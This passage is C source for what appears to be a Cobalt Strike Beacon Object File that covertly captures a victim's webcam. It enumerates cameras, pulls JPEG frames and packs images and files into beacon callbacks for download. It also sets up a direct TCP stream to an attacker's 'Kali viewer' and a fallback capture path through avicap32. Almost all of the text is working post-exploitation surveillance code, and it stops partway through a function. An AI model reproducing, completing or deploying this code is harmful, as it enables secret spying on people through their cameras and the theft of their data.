        CWebcamAccess_CloseDevice(wa);
        if (pSource)
            pSource->lpVtbl->Shutdown(pSource);
    }
    return hr;
}

HRESULT CWebcamAccess_PrepareKsPath(CWebcamAccess* wa, const char* path) {
    IMFAttributes* attr = NULL;
    IMFMediaSource* src = NULL;
    HRESULT hr;
    WCHAR wpath[768];
    int k;
    if (!pMFCreateDeviceSource || !path || !path[0])
        return E_FAIL;
    for (k = 0; path[k] && k < 767; k++)
        wpath[k] = (WCHAR)(unsigned char)path[k];
    wpath[k] = 0;
    hr = pMFCreateAttributes(&attr, 2);
    if (FAILED(hr))
        return hr;
    attr->lpVtbl->SetGUID(attr, &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
                          &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
    hr = attr->lpVtbl->SetString(attr, &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_SYMBOLIC_LINK, wpath);
    if (SUCCEEDED(hr))
        hr = pMFCreateDeviceSource(attr, &src);
    SAFE_RELEASE(attr);
    if (FAILED(hr) || !src) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] MFCreateDeviceSource 0x%08lx", hr);
        return FAILED(hr) ? hr : E_FAIL;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] KS source ok, pick MJPG");
    hr = CWebcamAccess_PrepareFromSource(wa, src);
    if (FAILED(hr))
        SAFE_RELEASE(src);
    else
        SAFE_RELEASE(src);
    return hr;
}

HRESULT CWebcamAccess_PrepareKs(CWebcamAccess* wa) {
    typedef HANDLE (WINAPI *PFN_SetupDiGetClassDevsA)(const GUID*, LPCSTR, HWND, DWORD);
    typedef BOOL (WINAPI *PFN_SetupDiEnumDeviceInterfaces)(HANDLE, VOID*, const GUID*, DWORD, VOID*);
    typedef BOOL (WINAPI *PFN_SetupDiGetDeviceInterfaceDetailA)(HANDLE, VOID*, VOID*, DWORD, DWORD*, VOID*);
    typedef BOOL (WINAPI *PFN_SetupDiDestroyDeviceInfoList)(HANDLE);
    typedef struct _SP_DEVICE_INTERFACE_DATA {
        DWORD cbSize;
        GUID InterfaceClassGuid;
        DWORD Flags;
        ULONG_PTR Reserved;
    } SP_DEVICE_INTERFACE_DATA;
    typedef struct _SP_DEVICE_INTERFACE_DETAIL_DATA_A {
        DWORD cbSize;
        CHAR DevicePath[1];
    } SP_DEVICE_INTERFACE_DETAIL_DATA_A;
    static const GUID kscat_capture = {0x65E8773D,0x8F56,0x11D0,{0xA3,0xB9,0x00,0xA0,0xC9,0x22,0x31,0x96}};
    static const GUID kscat_video   = {0x6994AD05,0x93EF,0x11D0,{0xA3,0xCC,0x00,0xA0,0xC9,0x22,0x31,0x96}};
    const GUID* cats[2];
    int c;
    HMODULE hSetup;
    PFN_SetupDiGetClassDevsA pGetClass;
    PFN_SetupDiEnumDeviceInterfaces pEnumIf;
    PFN_SetupDiGetDeviceInterfaceDetailA pDetail;
    PFN_SetupDiDestroyDeviceInfoList pDestroy;
    HRESULT last = E_FAIL;

    hSetup = LoadLibraryA("setupapi.dll");
    if (!hSetup)
        return E_FAIL;
    pGetClass = (PFN_SetupDiGetClassDevsA)GetProcAddress(hSetup, "SetupDiGetClassDevsA");
    pEnumIf = (PFN_SetupDiEnumDeviceInterfaces)GetProcAddress(hSetup, "SetupDiEnumDeviceInterfaces");
    pDetail = (PFN_SetupDiGetDeviceInterfaceDetailA)GetProcAddress(hSetup, "SetupDiGetDeviceInterfaceDetailA");
    pDestroy = (PFN_SetupDiDestroyDeviceInfoList)GetProcAddress(hSetup, "SetupDiDestroyDeviceInfoList");
    if (!pGetClass || !pEnumIf || !pDetail || !pDestroy)
        return E_FAIL;

    cats[0] = &kscat_video;
    cats[1] = &kscat_capture;
    for (c = 0; c < 2; c++) {
        HANDLE hdev;
        DWORD i;
        hdev = pGetClass(cats[c], NULL, NULL, 0x00000002 | 0x00000010);
        if (!hdev || hdev == (HANDLE)(LONG_PTR)-1)
            continue;
        for (i = 0; i < 32; i++) {
            SP_DEVICE_INTERFACE_DATA ifd;
            DWORD need = 0;
            SP_DEVICE_INTERFACE_DETAIL_DATA_A* det = NULL;
            char* path;
            ifd.cbSize = sizeof(ifd);
            if (!pEnumIf(hdev, NULL, cats[c], i, &ifd))
                break;
            pDetail(hdev, &ifd, NULL, 0, &need, NULL);
            if (need < 8)
                continue;
            det = (SP_DEVICE_INTERFACE_DETAIL_DATA_A*)malloc((size_t)need + 8);
            if (!det)
                continue;
            memset(det, 0, (size_t)need + 8);
            det->cbSize = 8; /* x64 header */
            if (!pDetail(hdev, &ifd, det, need, &need, NULL)) {
                free(det);
                continue;
            }
            path = det->DevicePath;
            BeaconPrintf(CALLBACK_OUTPUT, "[*] KS if %u: %s", i, path);
            if (ascii_has(path, "hdaudio") || ascii_has(path, "vid_0951") ||
                ascii_has(path, "mi_02") || ascii_has(path, "mi_01")) {
                free(det);
                continue;
            }
            if (!ascii_has(path, "usb#") && !ascii_has(path, "usb\\")) {
                free(det);
                continue;
            }
            last = CWebcamAccess_PrepareKsPath(wa, path);
            free(det);
            if (SUCCEEDED(last)) {
                pDestroy(hdev);
                return last;
            }
        }
        pDestroy(hdev);
    }
    return last;
}

HRESULT CWebcamAccess_PrepareDevice(CWebcamAccess* wa)
{
    HRESULT hr = S_OK;
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CWebcamAccess_PrepareDevice() called");
    BeaconPrintf(CALLBACK_OUTPUT,"\n[*] %d webcams detected",wa->m_cam_devices.count);
    if(wa->m_cam_devices.count == 0){
        BeaconPrintf(CALLBACK_ERROR,"No webcams detected");
        return -1;
    }
    if (wa->m_cam_devices.selection >= wa->m_cam_devices.count)
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Invalid camera selection: %u (count: %u)",wa->m_cam_devices.selection, wa->m_cam_devices.count);
        return E_FAIL;
    }


    IMFMediaSource* pSource = NULL;
    IMFAttributes* pAttributes = NULL;
    IMFMediaType* pType = NULL;
    // Get the selected device
    IMFActivate* pActivate = wa->m_cam_devices.ppDevices[wa->m_cam_devices.selection];

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Closing any existing webcam device");
    // Call the CloseDevice function via its function pointer
    CWebcamAccess_CloseDevice(wa);

    wa->m_ready = TRUE;
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Activating camera device");

    // Use the function pointer to activate the media source.
    hr = pActivate->lpVtbl->ActivateObject(pActivate, &IID_IMFMediaSource, (void**)&pSource);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to activate camera device (HRESULT: 0x%08X)", hr);
        return hr;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Camera device activated successfully");

    hr = pMFCreateAttributes(&pAttributes, 4);
    if (FAILED(hr))
        goto cleanup;

    /* Native MJPG samples — no decoder MFT (HW MFT → 0xc00d3704, RGB32 → 0xc00d36e6). */
    pAttributes->lpVtbl->SetUINT32(pAttributes, &s_MF_READWRITE_DISABLE_CONVERTERS, TRUE);
    pAttributes->lpVtbl->SetUINT32(pAttributes, &s_MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS, FALSE);
    pAttributes->lpVtbl->SetUINT32(pAttributes, &s_MF_SOURCE_READER_ENABLE_VIDEO_PROCESSING, FALSE);

    hr = pMFCreateSourceReaderFromMediaSource(pSource, pAttributes, &wa->m_pReader);
    if (FAILED(hr))
        goto cleanup;

    {
        DWORD i = 0;
        int pass = 0;
        HRESULT chosen = E_FAIL;
        /* pass 0: native 1920x1080, pass 1: 1280x720, pass 2: anything */
        for (pass = 0; pass < 3 && FAILED(chosen); pass++) {
            for (i = 0;; i++) {
                UINT32 tw = 0, th = 0;
                GUID sub = {0};
                DWORD fcc;
                HRESULT hrAsk, hrProbe;
                hr = wa->m_pReader->lpVtbl->GetNativeMediaType(wa->m_pReader,
                                                               (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
                                                               i,
                                                               &pType);
                if (FAILED(hr))
                    break;
                MFGetAttributeSize((IMFAttributes *)pType, &MF_MT_FRAME_SIZE, &tw, &th);
                pType->lpVtbl->GetGUID(pType, &MF_MT_SUBTYPE, &sub);
                fcc = sub.Data1;
                if (pass == 0 && i < 12) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[*] native idx=%u %ux%u %c%c%c%c",
                                 i, tw, th,
                                 (char)fcc, (char)(fcc >> 8),
                                 (char)(fcc >> 16), (char)(fcc >> 24));
                }
                if (pass == 0 && !(tw == 1920 && th == 1080)) {
                    SAFE_RELEASE(pType);
                    continue;
                }
                if (pass == 1 && !(tw == 1280 && th == 720)) {
                    SAFE_RELEASE(pType);
                    continue;
                }
                /* UVC 1080p is usually MJPG or YUY2; skip random HW-MFT subtypes. */
                if (pass < 2) {
                    if (fcc != 0x47504A4D && fcc != 0x32595559 && fcc != 0x3231564E
                        && fcc != 0x00000016 && fcc != 0x00000017) {
                        SAFE_RELEASE(pType);
                        continue;
                    }
                }
                /* MJPG is already JPEG — set native type, skip RGB conversion. */
                if (fcc == 0x47504A4D) {
                    hrAsk = wa->m_pReader->lpVtbl->SetCurrentMediaType(
                        wa->m_pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pType);
                    BeaconPrintf(CALLBACK_OUTPUT, "[*] native MJPG set %ux%u idx=%u hr=0x%08lx",
                                 tw, th, i, hrAsk);
                    if (SUCCEEDED(hrAsk)) {
                        hrProbe = CWebcamAccess_Probe(wa);
                        BeaconPrintf(CALLBACK_OUTPUT, "[*] native MJPG probe 0x%08lx", hrProbe);
                        if (SUCCEEDED(hrProbe)) {
                            wa->m_mjpg = TRUE;
                            wa->m_w = tw;
                            wa->m_h = th;
                            wa->m_ready = TRUE;
                            chosen = S_OK;
                            SAFE_RELEASE(pType);
                            break;
                        }
                    }
                }
                /* MJPG/NV12: software convert to RGB32 (HW MJPEG MFT → 0xc00d3704). */
                if (fcc == 0x47504A4D || fcc == 0x3231564E) {
                    hrAsk = CWebcamAccess_AskRGB32From(wa, pType);
                    BeaconPrintf(CALLBACK_OUTPUT, "[*] AskRGB32From %ux%u %c%c%c%c hr=0x%08lx",
                                 tw, th,
                                 (char)fcc, (char)(fcc >> 8),
                                 (char)(fcc >> 16), (char)(fcc >> 24),
                                 hrAsk);
                    if (SUCCEEDED(hrAsk)) {
                        hrProbe = CWebcamAccess_Probe(wa);
                        BeaconPrintf(CALLBACK_OUTPUT, "[*] rgb probe %ux%u idx=%u 0x%08lx",
                                     tw, th, i, hrProbe);
                        if (SUCCEEDED(hrProbe)) {
                            chosen = S_OK;
                            SAFE_RELEASE(pType);
                            break;
                        }
                    }
                }
                hr = CWebcamAccess_TryMediaType(wa, pType);
                SAFE_RELEASE(pType);
                if (FAILED(hr))
                    continue;
                hrProbe = CWebcamAccess_Probe(wa);
                BeaconPrintf(CALLBACK_OUTPUT, "[*] try %ux%u %c%c%c%c idx=%u probe=0x%08lx",
                             tw, th,
                             (char)fcc, (char)(fcc >> 8),
                             (char)(fcc >> 16), (char)(fcc >> 24),
                             i, hrProbe);
                if (SUCCEEDED(hrProbe)) {
                    chosen = S_OK;
                    break;
                }
            }
        }
        hr = chosen;
    }

cleanup:
    if (FAILED(hr))
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] preparing device 0x%08lx — next cam / VFW", hr);
        if (pSource)
        {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Shutting down media source");
            pSource->lpVtbl->Shutdown(pSource);
        }
        // Use the function pointer to close the device.
        CWebcamAccess_CloseDevice(wa);
    }

    SAFE_RELEASE(pSource);
    SAFE_RELEASE(pAttributes);
    SAFE_RELEASE(pType);

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CWebcamAccess_PrepareDevice() completed with HRESULT: 0x%08X", hr);
    return hr;
}




void CWebcamAccess_GetImageSizes(CWebcamAccess* wa, unsigned int* width, unsigned int* height) {
    if (wa->m_mjpg && wa->m_w && wa->m_h) {
        *width = wa->m_w;
        *height = wa->m_h;
        return;
    }
    *width = wa->m_color_converter.m_width;
    *height = wa->m_color_converter.m_height;
}

HRESULT CWebcamAccess_GetJpeg(CWebcamAccess* wa, BYTE** out, DWORD* outlen) {
    IMFSample* videoSample = NULL;
    IMFMediaBuffer* mbuf = NULL;
    DWORD streamIndex = 0, flags = 0;
    LONGLONG ts = 0;
    HRESULT hr;
    BYTE* p = NULL;
    DWORD maxl = 0, cur = 0;
    int ticks;
    *out = NULL;
    *outlen = 0;
    if (!wa->m_pReader)
        return E_FAIL;
    for (ticks = 0; ticks < 12; ticks++) {
        videoSample = NULL;
        hr = wa->m_pReader->lpVtbl->ReadSample(wa->m_pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0,
                                               &streamIndex, &flags, &ts, &videoSample);
        if (FAILED(hr))
            return hr;
        if ((flags & MF_SOURCE_READERF_STREAMTICK) || !videoSample) {
            SAFE_RELEASE(videoSample);
            continue;
        }
        hr = videoSample->lpVtbl->ConvertToContiguousBuffer(videoSample, &mbuf);
        SAFE_RELEASE(videoSample);
        if (FAILED(hr) || !mbuf)
            return FAILED(hr) ? hr : E_FAIL;
        hr = mbuf->lpVtbl->Lock(mbuf, &p, &maxl, &cur);
        if (FAILED(hr) || !p || cur < 16) {
            SAFE_RELEASE(mbuf);
            return FAILED(hr) ? hr : E_FAIL;
        }
        {
            DWORD i, start = 0;
            int found = 0;
            for (i = 0; i + 2 < cur; i++) {
                if (p[i] == 0xFF && p[i + 1] == 0xD8 && p[i + 2] == 0xFF) {
                    start = i;
                    found = 1;
                    break;
                }
            }
            if (!found) {
                mbuf->lpVtbl->Unlock(mbuf);
                SAFE_RELEASE(mbuf);
                return E_FAIL;
            }
            *outlen = cur - start;
            *out = (BYTE *)malloc((size_t)(*outlen));
            if (*out)
                memcpy(*out, p + start, (size_t)(*outlen));
        }
        mbuf->lpVtbl->Unlock(mbuf);
        SAFE_RELEASE(mbuf);
        if (!*out)
            return E_OUTOFMEMORY;
        return S_OK;
    }
    return E_FAIL;
}

HRESULT CWebcamAccess_Probe(CWebcamAccess* wa) {
    IMFSample* videoSample = NULL;
    DWORD streamIndex = 0, flags = 0;
    LONGLONG ts = 0;
    HRESULT hr;
    int ticks;
    if (!wa->m_pReader)
        return E_FAIL;
    for (ticks = 0; ticks < 10; ticks++) {
        videoSample = NULL;
        hr = wa->m_pReader->lpVtbl->ReadSample(wa->m_pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0,
                                               &streamIndex, &flags, &ts, &videoSample);
        if (FAILED(hr))
            return hr;
        if (flags & MF_SOURCE_READERF_STREAMTICK) {
            SAFE_RELEASE(videoSample);
            continue;
        }
        if (videoSample) {
            SAFE_RELEASE(videoSample);
            return S_OK;
        }
    }
    return E_FAIL;
}

HRESULT CWebcamAccess_GetImageData(CWebcamAccess* wa, BYTE* buffer, LONG stride) {
    if (!wa->m_ready) {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Webcam not ready, returning S_FALSE\n");
        return S_FALSE;
    }

    IMFSample* videoSample = NULL;
    DWORD streamIndex, flags;
    LONGLONG llVideoTimeStamp, llSampleDuration;
    HRESULT hr = S_OK;
    int samplesRead = 0;

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Entering image capture loop\n");

    while (!samplesRead) {
        hr = wa->m_pReader->lpVtbl->ReadSample(wa->m_pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0,
                                               &streamIndex, &flags, &llVideoTimeStamp, &videoSample);

        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] ReadSample failed with HRESULT: 0x%08lx\n", hr);
            break;
        }

        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] ReadSample succeeded, streamIndex: %u, flags: 0x%08x, timestamp: %lld\n",streamIndex, flags, llVideoTimeStamp);

        if (flags & MF_SOURCE_READERF_STREAMTICK) {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] StreamTick flag detected, continuing loop\n");
            continue;
        }

        if (videoSample) {
            samplesRead++;
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Video sample acquired\n");

            hr = videoSample->lpVtbl->SetSampleTime(videoSample, llVideoTimeStamp);
            if (FAILED(hr)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] SetSampleTime failed: 0x%08lx\n", hr);
            }
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] SetSampleTime success: 0x%08lx\n", hr);

            hr = videoSample->lpVtbl->GetSampleDuration(videoSample, &llSampleDuration);
            if (FAILED(hr)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] GetSampleDuration failed: 0x%08lx\n", hr);
            } else {
                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Sample duration: %lld\n", llSampleDuration);
            }

            IMFMediaBuffer* buf = NULL;
            hr = videoSample->lpVtbl->ConvertToContiguousBuffer(videoSample, &buf);
            if (FAILED(hr)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] ConvertToContiguousBuffer failed: 0x%08lx\n", hr);
            } else {
                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Successfully converted sample to contiguous buffer\n");
                //BeaconPrintf(CALLBACK_OUTPUT,"\n[DEBUG] Calling CColorConverter_ConvertImageToRGB32 with cc: %p, buffer: %p, stride: %ld, buf: %p\n",&wa->m_color_converter, buffer, stride, buf);
                CColorConverter_ConvertImageToRGB32(&wa->m_color_converter, buffer, stride, buf);

                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Image conversion to RGB32 complete\n");

                buf->lpVtbl->Unlock(buf);
                SAFE_RELEASE(buf);
            }

            SAFE_RELEASE(videoSample);
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Released video sample\n");
        }
    }

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Exiting image capture loop with HRESULT: 0x%08lx\n", hr);
    return hr;
}


/*Download Screenshot*/
void downloadScreenshot(char* jpg, int jpgLen, int session, char* windowTitle, int titleLen, char* username, int usernameLen) {
// Function modified by @BinaryFaultline

// This data helped me figure out the C code to download a screenshot. It was found in the BOF.NET code here: https://github.com/CCob/BOF.NET/blob/2da573a4a2a760b00e66cd051043aebb2cfd3182/managed/BOFNET/BeaconObject.cs
// Special thanks to CCob doing the research around the BeaconOutput options, making this much easier for me.

// private void WriteSessionUserNameTitle(BinaryWriter bw, int session, string userName, string title) {
//             bw.Write(session);
//             bw.Write(title.Length);
//             bw.Write(Encoding.UTF8.GetBytes(title));
//             bw.Write(userName.Length);
//             bw.Write(Encoding.UTF8.GetBytes(userName));
//         }

// var screenshotCallback = new BinaryWriter(new MemoryStream());
//             screenshotCallback.Write(jpgData.Length);
//             screenshotCallback.Write(jpgData);
//             WriteSessionUserNameTitle(screenshotCallback, session, userName, title);
    int messageLength = 4 + jpgLen + 4 + 4 + titleLen + 4 + usernameLen;
    char* packedData = (char*)MSVCRT$malloc(messageLength);

    // //pack on jpgLen/fileSize as 4-byte int second
    packedData[0] = jpgLen & 0xFF;
    packedData[1] = (jpgLen >> 8) & 0xFF;
    packedData[2] = (jpgLen >> 16) & 0xFF;
    packedData[3] = (jpgLen >> 24) & 0xFF;

    int packedIndex = 4;

    // //pack on the bytes of jpg/returnData
    for (int i = 0; i < jpgLen; i++) {
        packedData[packedIndex] = jpg[i];
        packedIndex++;
    }
    
    //pack on session as 4-byte int first
    packedData[packedIndex] = session & 0xFF;
    packedData[packedIndex + 1] = (session >> 8) & 0xFF;
    packedData[packedIndex + 2] = (session >> 16) & 0xFF;
    packedData[packedIndex + 3] = (session >> 24) & 0xFF;

    //pack on titleLength as 4-byte int second
    packedData[packedIndex + 4] = titleLen & 0xFF;
    packedData[packedIndex + 5] = (titleLen >> 8) & 0xFF;
    packedData[packedIndex + 6] = (titleLen >> 16) & 0xFF;
    packedData[packedIndex + 7] = (titleLen >> 24) & 0xFF;
    
    packedIndex += 8;

    //pack on the bytes of title
    for (int i = 0; i < titleLen; i++) {
        packedData[packedIndex] = windowTitle[i];
        packedIndex++;
    }

    //pack on userLength as 4-byte int second
    packedData[packedIndex] = usernameLen & 0xFF;
    packedData[packedIndex + 1] = (usernameLen >> 8) & 0xFF;
    packedData[packedIndex + 2] = (usernameLen >> 16) & 0xFF;
    packedData[packedIndex + 3] = (usernameLen >> 24) & 0xFF;
    
    packedIndex += 4;

    //pack on the bytes of user
    for (int i = 0; i < usernameLen; i++) {
        packedData[packedIndex] = username[i];
        packedIndex++;
    }

    BeaconOutput(CALLBACK_SCREENSHOT, packedData, messageLength);
    return;
}

void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize)
{
    time_t t;
    MSVCRT$srand((unsigned)MSVCRT$time(&t));
    int fileId = MSVCRT$rand();

    int messageLength = downloadFileNameLength + 8;
    char* packedData = (char*)MSVCRT$malloc(messageLength);

    /* Pack fileId (4 bytes) */
    packedData[0] = (fileId >> 24) & 0xFF;
    packedData[1] = (fileId >> 16) & 0xFF;
    packedData[2] = (fileId >> 8) & 0xFF;
    packedData[3] = fileId & 0xFF;

    /* Pack fileSize (4 bytes) */
    packedData[4] = (fileSize >> 24) & 0xFF;
    packedData[5] = (fileSize >> 16) & 0xFF;
    packedData[6] = (fileSize >> 8) & 0xFF;
    packedData[7] = fileSize & 0xFF;

    int packedIndex = 8;
    for (int i = 0; i < downloadFileNameLength; i++) {
        packedData[packedIndex++] = fileName[i];
    }
    BeaconOutput(CALLBACK_FILE, packedData, messageLength);

    int chunkSize = 1024 * 900;
    if (fileSize > chunkSize) {
        int index = 0;
        while (index < fileSize) {
            if (fileSize - index > chunkSize) {
                int chunkLength = 4 + chunkSize;
                char* packedChunk = (char*)MSVCRT$malloc(chunkLength);
                packedChunk[0] = (fileId >> 24) & 0xFF;
                packedChunk[1] = (fileId >> 16) & 0xFF;
                packedChunk[2] = (fileId >> 8) & 0xFF;
                packedChunk[3] = fileId & 0xFF;
                int chunkIndex = 4;
                for (int i = index; i < index + chunkSize; i++) {
                    packedChunk[chunkIndex++] = returnData[i];
                }
                BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
                free(packedChunk);
            }
            else {
                int lastChunkLength = fileSize - index + 4;
                char* lastChunk = (char*)MSVCRT$malloc(lastChunkLength);
                lastChunk[0] = (fileId >> 24) & 0xFF;
                lastChunk[1] = (fileId >> 16) & 0xFF;
                lastChunk[2] = (fileId >> 8) & 0xFF;
                lastChunk[3] = fileId & 0xFF;
                int lastChunkIndex = 4;
                for (int i = index; i < fileSize; i++) {
                    lastChunk[lastChunkIndex++] = returnData[i];
                }
                BeaconOutput(CALLBACK_FILE_WRITE, lastChunk, lastChunkLength);
                free(lastChunk);
            }
            index += chunkSize;
        }
    }
    else {
        int chunkLength = 4 + fileSize;
        char* packedChunk = (char*)MSVCRT$malloc(chunkLength);
        packedChunk[0] = (fileId >> 24) & 0xFF;
        packedChunk[1] = (fileId >> 16) & 0xFF;
        packedChunk[2] = (fileId >> 8) & 0xFF;
        packedChunk[3] = fileId & 0xFF;
        int chunkIndex = 4;
        for (int i = 0; i < fileSize; i++) {
            packedChunk[chunkIndex++] = returnData[i];
        }
        BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
        free(packedChunk);
    }

    char packedClose[4];
    packedClose[0] = (fileId >> 24) & 0xFF;
    packedClose[1] = (fileId >> 16) & 0xFF;
    packedClose[2] = (fileId >> 8) & 0xFF;
    packedClose[3] = fileId & 0xFF;
    BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);

    free(packedData);
}

/* Direct TCP stream to Kali viewer (HiddenDesktop-style). go() blocks on a Coffee thread. */
typedef UINT_PTR SOCK_T;
typedef int (WINAPI *PFN_WSAStartup)(WORD, void *);
typedef int (WINAPI *PFN_WSACleanup)(void);
typedef SOCK_T (WINAPI *PFN_socket)(int, int, int);
typedef int (WINAPI *PFN_connect)(SOCK_T, const void *, int);
typedef int (WINAPI *PFN_send)(SOCK_T, const char *, int, int);
typedef int (WINAPI *PFN_closesocket)(SOCK_T);
typedef unsigned short (WINAPI *PFN_htons)(unsigned short);
typedef unsigned long (WINAPI *PFN_inet_addr)(const char *);
typedef HRESULT (WINAPI *PFN_MFStartup)(ULONG, DWORD);
typedef HRESULT (WINAPI *PFN_MFShutdown)(void);

typedef struct _SOCKADDR_IN_MIN {
    short          sin_family;
    unsigned short sin_port;
    unsigned long  sin_addr;
    char           sin_zero[8];
} SOCKADDR_IN_MIN;

static PFN_WSAStartup   pWSAStartup = NULL;
static PFN_WSACleanup   pWSACleanup = NULL;
static PFN_socket       pSocket = NULL;
static PFN_connect      pConnect = NULL;
static PFN_send         pSend = NULL;
static PFN_closesocket  pClosesocket = NULL;
static PFN_htons        pHtons = NULL;
static PFN_inet_addr    pInetAddr = NULL;
static PFN_MFStartup    pMFStartup = NULL;
static PFN_MFShutdown   pMFShutdown = NULL;

static BOOL ResolveWinsock(void) {
    HMODULE h = GetModuleHandleA("ws2_32.dll");
    if (!h) h = LoadLibraryA("ws2_32.dll");
    if (!h) return FALSE;
    pWSAStartup = (PFN_WSAStartup)GetProcAddress(h, "WSAStartup");
    pWSACleanup = (PFN_WSACleanup)GetProcAddress(h, "WSACleanup");
    pSocket = (PFN_socket)GetProcAddress(h, "socket");
    pConnect = (PFN_connect)GetProcAddress(h, "connect");
    pSend = (PFN_send)GetProcAddress(h, "send");
    pClosesocket = (PFN_closesocket)GetProcAddress(h, "closesocket");
    pHtons = (PFN_htons)GetProcAddress(h, "htons");
    pInetAddr = (PFN_inet_addr)GetProcAddress(h, "inet_addr");
    return pWSAStartup && pSocket && pConnect && pSend && pClosesocket && pHtons && pInetAddr;
}

static BOOL sock_send_all(SOCK_T s, const char *p, int n) {
    int off = 0;
    while (off < n) {
        int r = pSend(s, p + off, n - off, 0);
        if (r <= 0) return FALSE;
        off += r;
    }
    return TRUE;
}

/* VFW / avicap32 — USB cams that fail MF ReadSample (0xc00d3704) often still grab here. */
#define WM_CAP_START              0x0400
#define WM_CAP_SET_CALLBACK_FRAME (WM_CAP_START + 5)
#define WM_CAP_DRIVER_CONNECT     (WM_CAP_START + 10)
#define WM_CAP_DRIVER_DISCONNECT  (WM_CAP_START + 11)
#define WM_CAP_FILE_SAVEDIB       (WM_CAP_START + 25)
#define WM_CAP_EDIT_COPY          (WM_CAP_START + 30)
#define WM_CAP_GET_VIDEOFORMAT    (WM_CAP_START + 44)
#define WM_CAP_SET_PREVIEW        (WM_CAP_START + 50)
#define WM_CAP_SET_OVERLAY        (WM_CAP_START + 51)
#define WM_CAP_SET_PREVIEWRATE    (WM_CAP_START + 52)
#define WM_CAP_GRAB_FRAME         (WM_CAP_START + 60)
#define CF_BITMAP                 2
#define LR_LOADFROMFILE           0x0010
#define IMAGE_BITMAP              0

typedef HWND (WINAPI *PFN_capCreateCaptureWindowA)(LPCSTR, DWORD, int, int, int, int, HWND, int);
typedef LRESULT (WINAPI *PFN_SendMessageA)(HWND, UINT, WPARAM, LPARAM);
typedef HWND (WINAPI *PFN_CreateWindowExA)(DWORD, LPCSTR, LPCSTR, DWORD, int, int, int, int, HWND, HMENU, HINSTANCE, LPVOID);
typedef BOOL (WINAPI *PFN_DestroyWindow)(HWND);
typedef HANDLE (WINAPI *PFN_LoadImageA)(HINSTANCE, LPCSTR, UINT, int, int, UINT);
typedef BOOL (WINAPI *PFN_DeleteFileA)(LPCSTR);
typedef DWORD (WINAPI *PFN_GetTempPathA)(DWORD, LPSTR);
typedef BOOL (WINAPI *PFN_ShowWindow)(HWND, int);
typedef BOOL (WINAPI *PFN_OpenClipboard)(HWND);
typedef BOOL (WINAPI *PFN_CloseClipboard)(void);
typedef HANDLE (WINAPI *PFN_GetClipboardData)(UINT);

static int stream_vfw(SOCK_T sock, int quality, int interval) {
    HMODULE av = LoadLibraryA("avicap32.dll");
    HMODULE user = GetModuleHandleA("user32.dll");
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    PFN_capCreateCaptureWindowA pCapCreate;
    PFN_SendMessageA pSendMsg;
    PFN_CreateWindowExA pCreateWin;
    PFN_DestroyWindow pDestroyWin;
    PFN_LoadImageA pLoadImage;
    PFN_DeleteFileA pDel;
    PFN_GetTempPathA pTmp;
    PFN_ShowWindow pShow;
    PFN_OpenClipboard pOpenClip;
    PFN_CloseClipboard pCloseClip;
    PFN_GetClipboardData pGetClip;
    HWND parent, cap;
    char tmpdir[MAX_PATH];
    char dib[MAX_PATH];
    int frames = 0;
    int empty = 0;

    if (!av || !user || !k32) {
        BeaconPrintf(CALLBACK_ERROR, "vfw: load dll failed");
        return 0;
    }
    pCapCreate = (PFN_capCreateCaptureWindowA)GetProcAddress(av, "capCreateCaptureWindowA");
    pSendMsg = (PFN_SendMessageA)GetProcAddress(user, "SendMessageA");
    pCreateWin = (PFN_CreateWindowExA)GetProcAddress(user, "CreateWindowExA");
    pDestroyWin = (PFN_DestroyWindow)GetProcAddress(user, "DestroyWindow");
    pShow = (PFN_ShowWindow)GetProcAddress(user, "ShowWindow");
    pLoadImage = (PFN_LoadImageA)GetProcAddress(user, "LoadImageA");
    pDel = (PFN_DeleteFileA)GetProcAddress(k32, "DeleteFileA");
    pTmp = (PFN_GetTempPathA)GetProcAddress(k32, "GetTempPathA");
    pOpenClip = (PFN_OpenClipboard)GetProcAddress(user, "OpenClipboard");
    pCloseClip = (PFN_CloseClipboard)GetProcAddress(user, "CloseClipboard");
